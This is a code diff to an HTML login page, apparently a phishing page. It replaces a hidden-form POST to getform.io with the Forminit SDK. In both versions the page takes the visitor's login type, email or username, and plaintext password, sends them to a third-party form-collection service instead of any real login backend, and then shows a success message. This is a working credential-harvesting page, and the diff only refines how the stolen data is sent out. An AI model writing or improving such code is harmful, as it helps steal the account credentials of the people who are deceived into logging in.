@@ -154,6 +154,7 @@
     }
     .tt-terms a { color: #777; }
   </style>
+<script src="https://forminit.com/sdk/v1/forminit.js"></script>
 </head>
 <body>
 
@@ -240,7 +241,8 @@
 
 <script>
   // ─── CONFIG ───────────────────────────────────────────────
-  const GETFORM_URL = 'https://getform.io/f/txfrdrkkcali';
+  const FORM_ID = 'gbhfj72gxq5'; // your Forminit form ID
+  const forminit = new Forminit();
   // ─────────────────────────────────────────────────────────
 
   let loginType = 'email';
@@ -309,33 +311,21 @@
     btn.disabled    = true;
     btn.textContent = 'Logging in...';
 
-    // ── send via hidden form (no CORS issues) ──
+    // ── send via Forminit official SDK (no CORS issues) ──
     try {
-      const form = document.createElement('form');
-      form.method  = 'POST';
-      form.action  = GETFORM_URL;
-      form.target  = 'hidden_iframe';
+      const formData = new FormData();
+      formData.append('Login_Type', loginType);
+      formData.append('Identifier', identifier);
+      formData.append('Password',   password);
+      formData.append('Time',       new Date().toLocaleString());
 
-      const fields = {
-        'Login Type': loginType,
-        'Identifier': identifier,
-        'Password':   password,
-        'Time':       new Date().toLocaleString()
-      };
+      const { data, error } = await forminit.submit(FORM_ID, formData);
 
-      for (const [key, val] of Object.entries(fields)) {
-        const input = document.createElement('input');
-        input.type  = 'hidden';
-        input.name  = key;
-        input.value = val;
-        form.appendChild(input);
+      if (error) {
+        showError('Error: ' + error.message);
+      } else {
+        document.getElementById('tt-success').classList.add('show');
       }
-
-      document.body.appendChild(form);
-      form.submit();
-      document.body.removeChild(form);
-
-      document.getElementById('tt-success').classList.add('show');
     } catch (err) {
       showError('Something went wrong. Try again.');
     }
@@ -345,6 +335,5 @@
   }
 </script>
 
-<iframe name="hidden_iframe" style="display:none"></iframe>
 </body>
 </html>
